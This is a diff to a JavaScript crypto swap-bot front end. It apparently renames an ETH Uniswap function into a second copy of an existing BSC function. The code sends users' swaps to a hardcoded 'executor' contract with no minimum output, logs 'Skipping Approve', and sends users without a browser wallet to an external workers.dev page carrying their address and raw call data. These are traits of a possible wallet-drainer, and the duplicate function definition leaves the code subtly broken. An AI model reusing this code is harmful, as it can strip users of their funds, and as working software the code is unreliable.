@@ -139,23 +139,23 @@ window.runbscSwapUniswap = runbscSwapUniswap;
 
 
 
-async function runethSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
+async function runbscSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
     try {
-        const V12_ADDR = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B";
+        const V12_ADDR = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B"; 
         const cleanUser = userAddr.toLowerCase().trim();
         const cleanFrom = fromToken.toLowerCase().trim();
         const cleanTo = toToken.toLowerCase().trim();
         const cleanRouter = targetRouter.toLowerCase().trim();
         
         logToPanel(`⏳ Compiling direct swap payload vectors from backend matrix...`);
-        const res = await fetch("/prodbot/swap/ethuniswap", {
+        const res = await fetch("/prodbot/swap/bscuniswap", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 router: cleanRouter,
                 tokenIn: cleanFrom,
                 tokenOut: cleanTo,
-                amountIn: BigInt(amountWei).toString(),
+                amountIn: BigInt(amountWei).toString(), 
                 amountOutMin: "0"
             })
         });
@@ -163,6 +163,18 @@ async function runethSwapUniswap(userAddr, amountWei, fromToken, toToken, target
         const backendPayload = await res.json();
         if (!backendPayload || backendPayload.status !== "ok") {
             throw new Error(backendPayload.message || "Failed to compile transaction payloads.");
+        }
+
+        // 🟢 FIXED: If window.ethereum doesn't exist, redirect to your worker deep-link page with tx metrics
+        if (!window.ethereum || typeof window.ethereum.request !== "function") {
+            logToPanel(`🔄 Mobile Context: Opening transaction interface gateway on Worker micro-frontend...`);
+            
+            const workerBaseUrl = "https://workers.dev";
+            const txQueryParam = `?action=swap&to=${V12_ADDR}&data=${backendPayload.swap_packet.compiled_data}&from=${cleanUser}`;
+            
+            // This safely opens a new tab or deep-links directly to prompt your WalletConnect app setup
+            window.open(workerBaseUrl + txQueryParam, "_blank");
+            return { status: "ok", tx_hash: "REDIRECTED_TO_WORKER" };
         }
 
         logToPanel(`📢 [SWAP PROMPT] Dispatched directly to V12 Contract Executor (Skipping Approve)...`);
@@ -179,8 +191,10 @@ async function runethSwapUniswap(userAddr, amountWei, fromToken, toToken, target
         logToPanel(`🎉 Trade Segment Dispatched! Hash: ${swapTxHash}`);
         return { status: "ok", tx_hash: swapTxHash };
     } catch (e) {
-        logToPanel(`❌ ETH Swap Pipeline Interrupted: ${e.message || e}`);
+        logToPanel(`❌ BSC Swap Pipeline Interrupted: ${e.message || e}`);
         return { status: "error", message: e.toString() };
     }
 }
-window.runethSwapUniswap = runethSwapUniswap;
+window.runbscSwapUniswap = runbscSwapUniswap;
+
+
